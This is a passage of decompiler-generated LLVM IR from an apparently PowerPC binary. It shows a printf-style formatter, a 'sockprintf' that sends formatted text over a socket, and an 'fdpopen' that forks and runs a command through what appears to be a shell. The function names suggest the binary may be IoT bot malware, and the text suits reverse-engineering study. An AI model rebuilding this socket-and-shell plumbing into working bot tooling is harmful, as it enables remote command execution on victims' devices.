  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001388c.15, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001170 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001170, i32* %stack_var_-160, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  %v2_1000128c = load i32, i32* %stack_var_-160, align 4
  %v1_10001298 = add i32 %v2_1000128c, -4
  %v2_10001298 = inttoptr i32 %v1_10001298 to i32*
  %v3_10001298 = load i32, i32* %v2_10001298, align 4
  store i32 %v3_10001298, i32* @r31, align 4
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_1002e608.16, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_1002e608.16, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.17 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.18 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.19 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v8_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10013894.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_10013490.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001389c.22 to i32), i32 %arg1, i32 0)
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.24 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

